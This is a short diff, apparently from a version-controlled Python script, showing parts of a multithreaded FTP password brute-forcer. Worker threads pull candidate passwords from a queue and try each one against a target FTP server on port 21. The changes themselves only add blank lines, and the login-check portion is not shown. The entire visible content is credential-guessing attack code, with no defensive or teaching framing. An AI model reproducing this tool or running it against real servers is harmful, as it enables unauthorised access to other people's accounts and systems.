@@ -66,12 +66,14 @@ port = 21
 
 def connect_ftp():
     global q
+
     while True:
         # get the password from the queue
         password = q.get()
         # initialize the FTP server object
         server = ftplib.FTP()
         print("[!] Trying", password)
+
         try:
             # tries to connect to FTP server with a timeout of 5
             server.connect(host, port, timeout=5)
@@ -102,11 +104,13 @@ print("[+] Passwords to try:", len(passwords))
 # put all passwords to the queue
 for password in passwords:
     q.put(password)
+
 # create `n_threads` that runs that function
 for t in range(n_threads):
     thread = Thread(target=connect_ftp)
     # will end when the main thread end
     thread.daemon = True
     thread.start()
+
 # wait for the queue to be empty
 q.join()
